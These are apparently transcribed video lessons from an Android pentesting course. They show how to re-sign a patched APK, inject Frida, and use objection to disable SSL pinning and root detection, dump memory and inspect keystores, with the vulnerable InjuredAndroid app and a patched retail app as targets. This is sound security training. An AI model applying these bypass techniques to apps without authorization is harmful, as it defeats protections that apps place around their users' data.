So I'm going to copy and paste this

225
00:09:10.790 --> 00:09:11.730
command here.

226
00:09:11.950 --> 00:09:13.910
I'm going to edit some parts of this.

227
00:09:14.090 --> 00:09:16.330
So I'm going to call my keystore, instead

228
00:09:16.330 --> 00:09:18.870
of calling it custom dot keystore, I'm going

229
00:09:18.870 --> 00:09:20.750
to call this demo dot keystore.

230
00:09:21.190 --> 00:09:23.930
And my alias name, I'm going to just

231
00:09:23.930 --> 00:09:25.910
name this demo keys.

232
00:09:26.430 --> 00:09:27.410
Just like this.

233
00:09:28.130 --> 00:09:29.830
So this is going to make a new

234
00:09:29.830 --> 00:09:30.330
keystore.

235
00:09:30.470 --> 00:09:32.390
Now you need to assign it a password.

236
00:09:32.850 --> 00:09:34.350
In my case, I'm just going to do

237
00:09:34.350 --> 00:09:35.710
test one, two, three.

238
00:09:36.250 --> 00:09:38.630
Obviously, this would be a horrible security practice

239
00:09:38.630 --> 00:09:40.650
if you were to sign an application like

240
00:09:40.650 --> 00:09:42.110
this and put it out there in the

241
00:09:42.110 --> 00:09:44.250
world with such a simple password.

242
00:09:44.370 --> 00:09:45.650
But for our case, I'm just going to

243
00:09:45.650 --> 00:09:46.790
do test one, two, three.

244
00:09:46.790 --> 00:09:49.410
Here you could fill out the developer details

245
00:09:49.410 --> 00:09:50.290
if you want to.

246
00:09:50.490 --> 00:09:54.030
So I'll just do Aaron Wilson, name of

247
00:09:54.030 --> 00:10:03.550
my organization, TCM Academy, mobile sec, no

248
00:10:03.550 --> 00:10:04.910
name, no city.

249
00:10:05.650 --> 00:10:06.450
That's fine.

250
00:10:06.570 --> 00:10:07.650
And then you need to do a yes

251
00:10:07.650 --> 00:10:09.270
at the end to confirm the changes.

252
00:10:10.130 --> 00:10:12.730
Okay, now this makes a keystore that we're

253
00:10:12.730 --> 00:10:14.630
going to be signing the application with.

254
00:10:14.870 --> 00:10:16.250
I'm going to go back here to our

255
00:10:16.250 --> 00:10:20.270
article and pick up this jar signer jar

256
00:10:20.270 --> 00:10:21.050
signer command.

257
00:10:21.490 --> 00:10:22.930
We're going to have to edit this as

258
00:10:22.930 --> 00:10:23.170
well.

259
00:10:23.330 --> 00:10:24.170
Paste the selection.

260
00:10:24.790 --> 00:10:27.410
Okay, so here it's saying we're going to

261
00:10:27.410 --> 00:10:31.330
sign this file, whatever it is, with SHA

262
00:10:31.330 --> 00:10:34.530
-1, with RSA, digest-alg SHA-1.

263
00:10:34.650 --> 00:10:36.670
And here the keystore needs to be specified.

264
00:10:37.030 --> 00:10:39.170
And of course, our name of our keystore

265
00:10:39.170 --> 00:10:42.210
is demo dot keystore.

266
00:10:45.790 --> 00:10:47.410
So I'm going to change this to demo.

267
00:10:47.970 --> 00:10:50.310
I'm going to change my store pass, which

268
00:10:50.310 --> 00:10:53.070
is my password that I just used, which

269
00:10:53.070 --> 00:10:54.470
is test one, two, three.

270
00:10:54.930 --> 00:10:57.090
The name of the APK that we are

271
00:10:57.090 --> 00:11:05.300
signing is injured, injured underscore patched dot APK.

272
00:11:05.520 --> 00:11:10.220
And my key alias name was demo keys.

273
00:11:11.320 --> 00:11:12.660
Press enter there.

274
00:11:12.840 --> 00:11:14.740
Now this is going to sign our injured

275
00:11:14.740 --> 00:11:16.560
underscore patched APK.

276
00:11:17.200 --> 00:11:18.900
So that we'll be able to actually run

277
00:11:18.900 --> 00:11:21.460
this on an Android device, because remember every

278
00:11:21.460 --> 00:11:23.620
single application needs to be signed.

279
00:11:24.180 --> 00:11:26.100
Now we're going to go back to our

280
00:11:26.100 --> 00:11:27.400
article for the next step.

281
00:11:27.880 --> 00:11:30.040
Here it says to use the jar signer

282
00:11:30.040 --> 00:11:31.540
command to verify this.

283
00:11:31.640 --> 00:11:33.240
So I'm just going to do jar signer,

284
00:11:35.590 --> 00:11:38.650
jar signer dash verify.

285
00:11:39.050 --> 00:11:41.570
And the name of our application, remember, is

286
00:11:41.570 --> 00:11:44.270
injured underscore patched dot APK.

287
00:11:44.950 --> 00:11:46.750
This is going to just verify that everything

288
00:11:46.750 --> 00:11:47.450
is fine.

289
00:11:48.290 --> 00:11:50.730
Certificate chain is invalid because this is a

290
00:11:50.730 --> 00:11:51.750
self-signed certificate.

291
00:11:52.030 --> 00:11:54.070
But in our case, this is absolutely fine,

292
00:11:54.250 --> 00:11:55.550
because we're just going to be running this

293
00:11:55.550 --> 00:11:56.690
application locally.

294
00:11:57.230 --> 00:11:58.890
The very last thing that we need to

295
00:11:58.890 --> 00:12:00.550
do is do a zip align.

296
00:12:00.730 --> 00:12:03.130
If you look at the instructions here, it's

297
00:12:03.130 --> 00:12:05.370
a zip align for, and then we're going

298
00:12:05.370 --> 00:12:07.390
to output this as kind of like a

299
00:12:07.390 --> 00:12:08.990
finally named APK.

300
00:12:09.850 --> 00:12:11.170
Paste my selection here.

301
00:12:11.270 --> 00:12:13.690
So it's saying zip align for, then we

302
00:12:13.690 --> 00:12:16.530
provide the name of our application, which is

303
00:12:16.530 --> 00:12:19.170
under injured underscore patched dot APK.

304
00:12:19.610 --> 00:12:21.430
And I'm going to name the very final

305
00:12:21.430 --> 00:12:26.890
file as injured underscore patched final dot APK.

306
00:12:28.150 --> 00:12:30.470
Let that run, do an ls here.

307
00:12:30.670 --> 00:12:32.730
So now we have our two APKs here.

308
00:12:32.850 --> 00:12:34.710
This one is the final one that was

309
00:12:34.710 --> 00:12:36.690
aligned through zip align, so it's going to

310
00:12:36.690 --> 00:12:37.310
run properly.

311
00:12:38.010 --> 00:12:40.650
And then we have our injured underscore patched,

312
00:12:40.650 --> 00:12:42.250
which was the one that we just signed

313
00:12:42.250 --> 00:12:43.290
and everything like that.

314
00:12:43.610 --> 00:12:46.430
The injured underscore patched final is the one

315
00:12:46.430 --> 00:12:48.450
we're going to be installing on our Android

316
00:12:48.450 --> 00:12:48.870
phone.

317
00:12:49.070 --> 00:12:51.390
So now that this file is ready, I'm

318
00:12:51.390 --> 00:12:53.010
going to go back to my emulator here,

319
00:12:53.030 --> 00:12:56.790
and we need to uninstall our current injured

320
00:12:56.790 --> 00:12:57.870
Android application.

321
00:12:58.050 --> 00:13:00.150
Otherwise, our install is not going to work.

322
00:13:00.950 --> 00:13:04.810
Okay, now that that's uninstalled, I'm going to

323
00:13:04.810 --> 00:13:07.330
transfer the file from my Kali Linux box

324
00:13:07.330 --> 00:13:09.170
over to my Windows machine.

325
00:13:10.610 --> 00:13:12.090
So I'm going to go to the file

326
00:13:12.090 --> 00:13:12.990
manager here.

327
00:13:13.310 --> 00:13:15.210
I'm going to put in Kali Kali as

328
00:13:15.210 --> 00:13:15.870
my password.

329
00:13:19.910 --> 00:13:22.850
I'm going to go to home Kali desktop.

330
00:13:23.110 --> 00:13:24.390
This is where my file is stored.

331
00:13:24.470 --> 00:13:27.050
You can see the injured underscore patched final

332
00:13:27.050 --> 00:13:28.230
dot APK.

333
00:13:28.390 --> 00:13:29.750
You can save this wherever.

334
00:13:29.910 --> 00:13:31.610
I'm going to go to my user directory

335
00:13:31.610 --> 00:13:32.170
here.

336
00:13:46.270 --> 00:13:48.550
So here I made a new folder called

337
00:13:48.550 --> 00:13:50.790
patched apps under my username on my Windows

338
00:13:50.790 --> 00:13:51.150
machine.

339
00:13:51.490 --> 00:13:53.410
I'm going to use this little arrow here

340
00:13:53.410 --> 00:13:54.990
to transfer the file over.

341
00:13:55.130 --> 00:13:57.910
So here's my injured underscore patched final dot

342
00:13:57.910 --> 00:13:58.510
APK.

343
00:13:58.810 --> 00:14:01.110
Now I'm going to open up that folder

344
00:14:01.110 --> 00:14:02.310
in my documents.

345
00:14:07.390 --> 00:14:10.390
Okay, so here is my patched app directory

346
00:14:10.390 --> 00:14:11.890
on my Windows machine.

347
00:14:12.030 --> 00:14:13.790
You can see I have the injured underscore

348
00:14:13.790 --> 00:14:17.470
patched final dot APK, have my emulator right

349
00:14:17.470 --> 00:14:17.730
here.

350
00:14:17.810 --> 00:14:19.330
All we need to do is drag and

351
00:14:19.330 --> 00:14:19.870
drop this.

352
00:14:19.970 --> 00:14:22.730
You could also do an adb install of

353
00:14:22.730 --> 00:14:24.250
this application as well.

354
00:14:26.050 --> 00:14:28.990
Okay, we can see injured Android is installed

355
00:14:28.990 --> 00:14:29.390
here.

356
00:14:29.870 --> 00:14:32.830
Now I'm going to start injured Android and

357
00:14:34.650 --> 00:14:36.490
we will see this white screen for a

358
00:14:36.490 --> 00:14:38.330
little while, but this is good because that

359
00:14:38.330 --> 00:14:40.750
means that our Frida gadget has actually been

360
00:14:40.750 --> 00:14:41.930
installed successfully.

361
00:14:42.270 --> 00:14:44.430
Now I'm going to do the command objection

362
00:14:44.430 --> 00:14:47.290
explore and this is going to hook right

363
00:14:47.290 --> 00:14:49.130
into Frida and now we'll be able to

364
00:14:49.130 --> 00:14:51.530
do things like control our application.

365
00:14:52.270 --> 00:14:54.070
And now that we're here we can do

366
00:14:54.070 --> 00:14:58.870
commands with objection like android SSL pinning like

367
00:15:00.180 --> 00:15:01.520
that and disable.

368
00:15:01.640 --> 00:15:02.800
And you can see it kind of shows

369
00:15:02.800 --> 00:15:04.520
you some different options and you can do

370
00:15:04.520 --> 00:15:05.760
tab to complete them.

371
00:15:06.640 --> 00:15:10.240
So here it's going to be disabling SSL

372
00:15:10.240 --> 00:15:11.720
pinning as we're using it.

373
00:15:12.040 --> 00:15:13.440
So if we go back to burp suite,

374
00:15:13.560 --> 00:15:16.020
turn our intercept back on, go back to

375
00:15:16.020 --> 00:15:17.500
this SSL pinning here.

376
00:15:17.940 --> 00:15:21.380
We can see the traffic here.

377
00:15:22.080 --> 00:15:23.460
Keep on forwarding.

378
00:15:26.300 --> 00:15:29.460
I'm going to submit a flag and we

379
00:15:29.460 --> 00:15:31.520
can see here we have the epic awesomeness

380
00:15:31.520 --> 00:15:31.880
again.

381
00:15:32.680 --> 00:15:36.200
And usually objection will show you what it

382
00:15:36.200 --> 00:15:38.900
actually dropped in terms of SSL pinning.

383
00:15:39.700 --> 00:15:41.920
In this case it's not really dropping anything

384
00:15:41.920 --> 00:15:44.820
and we already intercepted the flag anyway by

385
00:15:44.820 --> 00:15:47.440
using burp suite without breaking SSL pinning.

386
00:15:47.600 --> 00:15:49.360
But this is exactly what you would do

387
00:15:49.360 --> 00:15:52.160
if you had an application that actually implemented

388
00:15:52.160 --> 00:15:53.140
SSL pinning.

389
00:15:53.580 --> 00:15:56.940
In the live bug bounty hunt we will

390
00:15:56.940 --> 00:15:59.640
have more examples of this and maybe some

391
00:15:59.640 --> 00:16:02.200
different scenarios where we're going to have to

392
00:16:02.200 --> 00:16:04.600
change how we're patching this application.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.560 --> 00:00:02.400
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's wrap up our Android pen testing

2
00:00:02.400 --> 00:00:04.740
by talking about the last bits of dynamic

3
00:00:04.740 --> 00:00:05.300
analysis.

4
00:00:05.900 --> 00:00:06.820
Now this is going to have to do

5
00:00:06.820 --> 00:00:09.280
a little bit with objection and also places

6
00:00:09.280 --> 00:00:11.340
that you can actually look in Android Studio

7
00:00:11.340 --> 00:00:13.120
to see certain things running.

8
00:00:13.680 --> 00:00:16.840
So now that we have objection injected into

9
00:00:16.840 --> 00:00:19.180
our application, I'm going to click injured Android

10
00:00:19.180 --> 00:00:20.140
to open it again.

11
00:00:20.620 --> 00:00:23.020
Now remember to explore the application at this

12
00:00:23.020 --> 00:00:25.420
point, we can do objection explore in our

13
00:00:25.420 --> 00:00:27.620
Windows machine here, and it's going to connect

14
00:00:27.620 --> 00:00:29.000
to our application.

15
00:00:29.900 --> 00:00:32.000
Now besides what we did with the SSL

16
00:00:32.000 --> 00:00:36.400
pinning disable with injured Android in the previous

17
00:00:36.400 --> 00:00:38.420
lesson, we can also do a lot of

18
00:00:38.420 --> 00:00:38.960
other things.

19
00:00:39.120 --> 00:00:42.460
So for example, everything with Android can be

20
00:00:42.460 --> 00:00:45.300
found right here, we can do things like

21
00:00:45.300 --> 00:00:46.000
the clipboard.

22
00:00:46.580 --> 00:00:50.060
So clipboard monitor, you can use that it's

23
00:00:50.060 --> 00:00:51.300
currently broken, I think.

24
00:00:51.700 --> 00:00:53.560
But this used to be used in the

25
00:00:53.560 --> 00:00:55.580
past where you can actually monitor the clipboard

26
00:00:55.580 --> 00:00:58.000
to see what is being copied to the

27
00:00:58.000 --> 00:01:00.780
clipboard by the application or by the user.

28
00:01:01.300 --> 00:01:03.980
Also other things in here such as you

29
00:01:03.980 --> 00:01:07.320
can type memory here, dump, and you can

30
00:01:07.320 --> 00:01:10.880
do all or from certain areas of memory.

31
00:01:11.380 --> 00:01:13.420
If you had a specific memory address that

32
00:01:13.420 --> 00:01:16.380
you wanted to investigate, you could use this

33
00:01:16.380 --> 00:01:17.520
to dump the memory.

34
00:01:18.620 --> 00:01:20.280
Okay, so it says it needs a local

35
00:01:20.280 --> 00:01:20.920
destination.

36
00:01:21.840 --> 00:01:26.820
There's also under Android here, you can do

37
00:01:26.820 --> 00:01:47.440
a heap here, you can do you can

38
00:01:47.440 --> 00:01:50.100
do SQLite commands here if there's a SQLite

39
00:01:50.100 --> 00:01:51.340
database that you know about.

40
00:01:52.000 --> 00:01:53.840
So for example, if we had a database

41
00:01:53.840 --> 00:01:56.000
named something that we knew we could provide

42
00:01:56.000 --> 00:01:57.960
the file path right here to connect to

43
00:01:57.960 --> 00:02:00.620
that SQLite database if it's stored locally.

44
00:02:01.000 --> 00:02:05.720
There's actually a SQLite database for this application,

45
00:02:05.880 --> 00:02:07.699
but it's not actually stored locally.

46
00:02:08.160 --> 00:02:10.280
We can also do things here like we

47
00:02:10.280 --> 00:02:13.200
can go Android and all the different options

48
00:02:13.200 --> 00:02:13.840
are right here.

49
00:02:13.920 --> 00:02:15.980
We can hook to different methods, we can

50
00:02:15.980 --> 00:02:18.320
provide it certain intents to get to maybe

51
00:02:18.320 --> 00:02:19.080
different things.

52
00:02:19.440 --> 00:02:21.480
We could do keystore here and we can

53
00:02:21.480 --> 00:02:28.000
oops Android keystore and we could like list

54
00:02:28.000 --> 00:02:31.020
it, see what's stored in the keystore there.

55
00:02:32.020 --> 00:02:36.220
We could also do a watch so it

56
00:02:36.220 --> 00:02:38.320
can watch for any instance where the keystore

57
00:02:38.320 --> 00:02:40.680
is actually called by our application in case

58
00:02:40.680 --> 00:02:44.200
it's storing sensitive information into the keystore.

59
00:02:45.840 --> 00:02:48.200
And also we can do, I mean like

60
00:02:48.200 --> 00:02:49.820
any, there's all kinds of different things you

61
00:02:49.820 --> 00:02:50.660
can do with Frida.

62
00:02:50.900 --> 00:02:53.620
There's also tonnes and tonnes of different scripts

63
00:02:53.620 --> 00:02:55.980
out there that people have written with different

64
00:02:55.980 --> 00:02:57.380
Frida commands.

65
00:02:57.820 --> 00:02:59.900
So also like you can do root detection

66
00:02:59.900 --> 00:03:00.320
here.

67
00:03:00.580 --> 00:03:03.320
So you can disable root detection if your

68
00:03:03.320 --> 00:03:05.080
application is doing that.

69
00:03:05.220 --> 00:03:07.960
You can also simulate a rooted environment by

70
00:03:07.960 --> 00:03:09.480
doing the command simulate here.

71
00:03:10.000 --> 00:03:13.220
And so some applications might actually crash when

72
00:03:13.220 --> 00:03:17.080
root detection is enabled if you try to

73
00:03:17.080 --> 00:03:18.780
root the device or run it on some

74
00:03:18.780 --> 00:03:20.040
type of a rooted device.

75
00:03:20.400 --> 00:03:21.700
So that's a way that you can try

76
00:03:21.700 --> 00:03:22.840
to bypass that.

77
00:03:23.700 --> 00:03:28.820
And also you can do shell commands from

78
00:03:28.820 --> 00:03:29.160
here.

79
00:03:29.300 --> 00:03:31.820
And obviously we also have our SSL pinning

80
00:03:31.820 --> 00:03:36.480
disable function here to disable SSL pinning, which

81
00:03:36.480 --> 00:03:38.460
we'll show you more when we actually do

82
00:03:38.460 --> 00:03:41.400
the bug bounty hunt because we were able

83
00:03:41.400 --> 00:03:43.760
to get the flag related to SSL pinning

84
00:03:44.480 --> 00:03:45.760
from this application.

85
00:03:47.520 --> 00:03:49.540
Other things that we can do in terms

86
00:03:49.540 --> 00:03:52.440
of dynamic analysis that you should always do

87
00:03:52.440 --> 00:03:54.860
when you're running an application, you should go

88
00:03:54.860 --> 00:03:57.460
to the file explorer here and look for

89
00:03:57.460 --> 00:03:59.420
things like under data here.

90
00:03:59.840 --> 00:04:01.680
Applications are always going to be under data,

91
00:04:01.740 --> 00:04:04.240
data, BNAC, injured android for example.

92
00:04:04.680 --> 00:04:06.500
You can look in these code caches and

93
00:04:06.500 --> 00:04:08.720
things like this for anything that's stored.

94
00:04:09.080 --> 00:04:11.900
For example, here we have our firebase authentication

95
00:04:11.900 --> 00:04:12.540
here.

96
00:04:12.980 --> 00:04:14.920
This is something that we can actually read

97
00:04:14.920 --> 00:04:15.959
out of here, right?

98
00:04:16.459 --> 00:04:19.060
We can also look for anything like a

99
00:04:19.060 --> 00:04:21.280
SQL like database that might be stored here.

100
00:04:21.640 --> 00:04:22.700
We'll do some of that in the bug

101
00:04:22.700 --> 00:04:23.480
bounty as well.

102
00:04:23.760 --> 00:04:26.600
Also there's some stuff here about SSL caches.

103
00:04:28.160 --> 00:04:31.300
This is like an encrypted file, has some

104
00:04:31.300 --> 00:04:32.540
information about port swagger.

105
00:04:33.040 --> 00:04:35.060
So we know that this has something to

106
00:04:35.060 --> 00:04:40.480
do with our proxying of the application.

107
00:04:41.120 --> 00:04:43.660
And also what you should do is look

108
00:04:43.660 --> 00:04:46.240
through the logcat as you're going through functionality,

109
00:04:46.440 --> 00:04:46.640
right?

110
00:04:46.940 --> 00:04:48.960
So as you're going from screen to screen,

111
00:04:49.120 --> 00:04:51.120
you want to look into the logcat and

112
00:04:51.120 --> 00:04:55.260
see if anything is being shown here that

113
00:04:55.260 --> 00:04:56.020
might be sensitive.

114
00:04:56.740 --> 00:04:59.340
You can even, yeah, see you can basically

115
00:04:59.340 --> 00:05:01.520
select any type of application here.

116
00:05:01.640 --> 00:05:04.140
Obviously here we want to use injured android

117
00:05:04.140 --> 00:05:06.600
to just see the logs related to that,

118
00:05:06.980 --> 00:05:09.080
but we can like navigate around to the

119
00:05:09.080 --> 00:05:09.660
application.

120
00:05:09.920 --> 00:05:10.920
I don't know how I got to my

121
00:05:10.920 --> 00:05:11.880
Google account there.

122
00:05:13.300 --> 00:05:16.040
We can navigate around inside of the application

123
00:05:16.040 --> 00:05:18.500
and see if it's actually running anything bad

124
00:05:18.500 --> 00:05:18.880
here.

125
00:05:19.980 --> 00:05:21.520
Looks like we might have crashed.

126
00:05:21.660 --> 00:05:22.620
Let me exit this.

127
00:05:24.580 --> 00:05:26.940
Exit injured android on the actual phone.

128
00:05:28.020 --> 00:05:30.800
Start it again and run our objection explorer.

129
00:05:33.220 --> 00:05:34.980
And we can see the logs going by

130
00:05:34.980 --> 00:05:36.680
as the application is running.

131
00:05:37.180 --> 00:05:39.080
That's exactly where we want to look for

132
00:05:39.080 --> 00:05:40.000
sensitive data.

133
00:05:42.540 --> 00:05:44.100
Just scrolling around the app.

134
00:05:44.160 --> 00:05:45.520
This would be part of kind of like

135
00:05:45.520 --> 00:05:47.300
what I would do as the final parts

136
00:05:47.300 --> 00:05:49.620
of my dynamic analysis to look for anything

137
00:05:49.620 --> 00:05:51.380
that maybe I didn't find before.

138
00:05:52.160 --> 00:05:54.600
Obviously you could also obviously go to the

139
00:05:54.600 --> 00:05:58.840
SD card in the file explorer here.

140
00:05:58.920 --> 00:06:01.400
There's nothing related to our injured android app

141
00:06:01.400 --> 00:06:01.700
here.

142
00:06:02.060 --> 00:06:03.560
That's something you would want to look at

143
00:06:03.560 --> 00:06:04.180
as well.

144
00:06:04.800 --> 00:06:06.780
All right, let's hop into the live bug

145
00:06:06.780 --> 00:06:08.260
bounty hunt and see if we can put

146
00:06:08.260 --> 00:06:10.000
everything together that we've learned.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.600 --> 00:00:02.340
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Next I wanted to just introduce you to

2
00:00:02.340 --> 00:00:05.480
a cool website called the Frida Codeshare.

3
00:00:05.720 --> 00:00:07.080
We're going to get into this in the

4
00:00:07.080 --> 00:00:09.040
next video of what all this code can

5
00:00:09.040 --> 00:00:10.720
be used for, but you can just go

6
00:00:10.720 --> 00:00:13.080
out there and use Google and look for

7
00:00:13.080 --> 00:00:13.980
Frida Codeshare.

8
00:00:14.220 --> 00:00:17.420
It's codeshare.frida.re. If we click in

9
00:00:17.420 --> 00:00:19.320
here you'll see that you can just go

10
00:00:19.320 --> 00:00:20.580
ahead and browse the code.

11
00:00:20.800 --> 00:00:23.440
There's lots of different projects in here and

12
00:00:23.440 --> 00:00:25.420
this can actually be very helpful for us

13
00:00:25.420 --> 00:00:27.980
for running some different Frida scripts when we're

14
00:00:27.980 --> 00:00:29.600
starting up our application.

15
00:00:30.200 --> 00:00:32.360
So if we have Frida actually injected into

16
00:00:32.360 --> 00:00:35.460
the app we can use these different JavaScripts

17
00:00:35.460 --> 00:00:36.720
to do different things.

18
00:00:36.920 --> 00:00:39.880
So for example here there's a universal Android

19
00:00:39.880 --> 00:00:42.640
SSL pinning bypass so we can use this

20
00:00:42.640 --> 00:00:45.560
script to bypass a lot of common SSL

21
00:00:45.560 --> 00:00:46.400
pinning libraries.

22
00:00:46.840 --> 00:00:49.840
There's a Frida anti-root script here so

23
00:00:49.840 --> 00:00:52.100
if you need to bypass root detection in

24
00:00:52.100 --> 00:00:54.400
an application you can use that as well.

25
00:00:55.480 --> 00:00:57.300
And I mean there's all kinds of different

26
00:00:57.300 --> 00:01:00.220
things in this Codeshare.

27
00:01:00.340 --> 00:01:01.920
You can just go out and browse code,

28
00:01:02.180 --> 00:01:03.640
just look through all of them.

29
00:01:03.940 --> 00:01:06.240
I mean there's tons and tons of different

30
00:01:06.240 --> 00:01:10.060
codes out here that you can use, over

31
00:01:10.060 --> 00:01:10.780
12 pages.

32
00:01:11.540 --> 00:01:14.180
So I definitely recommend going out there taking

33
00:01:14.180 --> 00:01:18.040
a look at some of this code that's

34
00:01:18.040 --> 00:01:20.660
out there for basically as a Frida extension

35
00:01:20.660 --> 00:01:21.260
in a way.

36
00:01:21.540 --> 00:01:23.420
So let's take a look quickly at this

37
00:01:23.420 --> 00:01:26.620
universal Android SSL pinning bypass with Frida.

38
00:01:27.140 --> 00:01:30.400
You can see here that everything is just

39
00:01:30.400 --> 00:01:32.640
pretty much a JavaScript right here.

40
00:01:33.200 --> 00:01:34.720
So what we can actually do if you

41
00:01:34.720 --> 00:01:37.240
wanted to copy this and use it, what

42
00:01:37.240 --> 00:01:38.800
I recommend doing is that you can really

43
00:01:38.800 --> 00:01:41.560
just like highlight the whole thing, copy it,

44
00:01:41.960 --> 00:01:43.660
you can open your favorite text editor.

45
00:01:43.840 --> 00:01:45.980
In this case it's just Sublime Text for

46
00:01:45.980 --> 00:01:46.220
Me.

47
00:01:46.220 --> 00:01:49.160
Okay and you can see this is our

48
00:01:49.160 --> 00:01:51.540
script here.

49
00:01:51.980 --> 00:01:54.860
I'm going to click Save As here and

50
00:01:54.860 --> 00:01:58.000
I'm going to just save this into my

51
00:01:58.000 --> 00:02:00.460
APK folder with all the rest of my

52
00:02:00.460 --> 00:02:01.140
applications.

53
00:02:02.520 --> 00:02:04.960
One second, let me navigate over there.

54
00:02:09.759 --> 00:02:12.420
So here is my APK folder and here

55
00:02:12.420 --> 00:02:17.740
I'll just call this SSL pinning universal.js.

56
00:02:18.000 --> 00:02:19.320
So I remember the name of the script

57
00:02:19.320 --> 00:02:21.220
and once you've done this you can join

58
00:02:21.220 --> 00:02:22.700
me in the next video and I'll show

59
00:02:22.700 --> 00:02:25.380
you exactly how to invoke these scripts when

60
00:02:25.380 --> 00:02:27.980
Frida is starting up in an injected application.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.640 --> 00:00:02.040
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, so let's get into how we can

2
00:00:02.040 --> 00:00:03.940
actually use some of these free-to-code

3
00:00:03.940 --> 00:00:06.480
-share scripts when we're starting up our application.

4
00:00:07.280 --> 00:00:08.520
So on my phone, I actually have a

5
00:00:08.520 --> 00:00:10.800
patched version of the Sam's Club app, which

6
00:00:10.800 --> 00:00:11.440
is right here.

7
00:00:11.920 --> 00:00:14.480
It's already patched with objection, but I want

8
00:00:14.480 --> 00:00:16.020
to show you really quickly how we can

9
00:00:16.020 --> 00:00:17.480
actually call the script.

10
00:00:17.980 --> 00:00:19.560
And the script that we grabbed off the

11
00:00:19.560 --> 00:00:22.220
free-to-code-share was this ssl-pinning

12
00:00:22.220 --> 00:00:24.960
-universal.js. You can see it right here

13
00:00:24.960 --> 00:00:26.180
in Sublime Text.

14
00:00:27.040 --> 00:00:29.380
And it's right here in our folder, our

15
00:00:29.380 --> 00:00:34.860
APK folder, right here as ssl-pinning-universal

16
00:00:34.860 --> 00:00:37.140
.js. So how do I actually call this

17
00:00:37.140 --> 00:00:38.900
script and use it when I'm starting up

18
00:00:38.900 --> 00:00:39.800
the Sam's Club app?

19
00:00:39.940 --> 00:00:41.460
Well, it's actually really easy.

20
00:00:41.720 --> 00:00:43.240
All we need to do is just do

21
00:00:43.240 --> 00:00:45.880
an objection explore, just like we normally would

22
00:00:45.880 --> 00:00:48.280
do if we were hooking an application using

23
00:00:48.280 --> 00:00:48.740
objection.

24
00:00:49.480 --> 00:00:50.820
What we do is do a dash dash

25
00:00:50.820 --> 00:00:53.680
startup, dash script here, and then we're going

26
00:00:53.680 --> 00:00:56.000
to specify the name of our script.

27
00:00:56.000 --> 00:00:59.680
So I'll do ssl-pinning-universal.js. Now

28
00:00:59.680 --> 00:01:00.900
I'm going to start up the Sam's Club

29
00:01:00.900 --> 00:01:01.220
app.

30
00:01:01.500 --> 00:01:03.480
I'm going to do my objection explore at

31
00:01:03.480 --> 00:01:04.200
the same time.

32
00:01:04.519 --> 00:01:07.160
You're going to see that it actually imported

33
00:01:07.160 --> 00:01:09.360
this script and started to run it right

34
00:01:09.360 --> 00:01:10.040
on startup.

35
00:01:10.480 --> 00:01:12.420
And this can be very, very helpful for

36
00:01:12.420 --> 00:01:13.940
you if you're trying to do things like

37
00:01:13.940 --> 00:01:15.360
bypassing root detection.

38
00:01:16.140 --> 00:01:18.040
Also, once you're in here, of course, you

39
00:01:18.040 --> 00:01:20.240
can always try to run the default scripts

40
00:01:20.240 --> 00:01:20.900
as well.

41
00:01:21.520 --> 00:01:23.460
So if I wanted to do a root

42
00:01:23.460 --> 00:01:25.760
disable here, I could do this as well

43
00:01:25.760 --> 00:01:29.420
with the default objection script to, you know,

44
00:01:29.780 --> 00:01:34.340
enable root detection and if you wanted to

45
00:01:34.340 --> 00:01:36.400
put any other scripts off the code share,

46
00:01:36.460 --> 00:01:37.460
you could do that as well.

47
00:01:37.760 --> 00:01:40.040
It's also worthwhile to note that you can

48
00:01:40.040 --> 00:01:43.600
run those universal generic scripts off of the

49
00:01:44.220 --> 00:01:46.020
objection explore command as well.

50
00:01:46.740 --> 00:01:48.440
So if I wanted to, say, for example,

51
00:01:48.440 --> 00:01:51.620
run this Android root disable, you can actually

52
00:01:51.620 --> 00:01:56.200
do that by specifying objection explore-s and

53
00:01:56.200 --> 00:01:57.500
then the name of the script.

54
00:01:57.680 --> 00:01:59.240
So if I wanted to do root disable,

55
00:01:59.600 --> 00:02:01.960
just a generic one that comes with objection,

56
00:02:02.480 --> 00:02:03.900
you can do that this way as well.

57
00:02:04.000 --> 00:02:05.940
Let me just restart the app so that

58
00:02:05.940 --> 00:02:07.080
you can see that in action.

59
00:02:09.389 --> 00:02:11.490
And you'll see that it will actually start

60
00:02:11.490 --> 00:02:14.950
triggering and it uses this right here.

61
00:02:15.130 --> 00:02:18.430
So it's looking for any instances where the

62
00:02:18.430 --> 00:02:20.130
app is trying to detect if we're root.

63
00:02:20.130 --> 00:02:23.630
So not only can you run scripts off

64
00:02:23.630 --> 00:02:25.850
the Frida code share, again, you're going to

65
00:02:25.850 --> 00:02:28.630
have to specify that one with dash-startup

66
00:02:28.630 --> 00:02:31.570
-script and you can also run the generic

67
00:02:32.170 --> 00:02:34.070
objection handlers here as well.

68
00:02:34.250 --> 00:02:36.330
This can be particularly helpful if you're having

69
00:02:36.330 --> 00:02:39.450
issues with SSL pinning or root detection in

70
00:02:39.450 --> 00:02:40.290
certain applications.

71
00:02:40.650 --> 00:02:42.350
So just keep these in your back pocket.

72
00:02:42.670 --> 00:02:44.190
It can always be helpful for you to

73
00:02:44.190 --> 00:02:46.770
run these as startup scripts as the app

74
00:02:46.770 --> 00:02:48.570
is starting, which can help you to bypass

75
00:02:48.570 --> 00:02:49.850
some protections.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.400 --> 00:00:01.660
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Of course, you're going to have this kind

2
00:00:01.660 --> 00:00:07.900
of format, right, where it's like objection, patch,

3
00:00:07.900 --> 00:00:11.040
apk, dash s, whatever the name of your

4
00:00:11.040 --> 00:00:13.820
apk is, right, let's say blada apk.

5
00:00:14.480 --> 00:00:16.660
Now if this is a newer application and

6
00:00:16.660 --> 00:00:19.800
it's using a kotlin format, something that you're

7
00:00:19.800 --> 00:00:21.400
going to get a lot of times is

8
00:00:21.400 --> 00:00:23.100
this kind of an error where it says

9
00:00:23.100 --> 00:00:27.540
invalid resource directory name, home framework, for example,

10
00:00:27.700 --> 00:00:30.620
debug, app debug, slash res navigation.

11
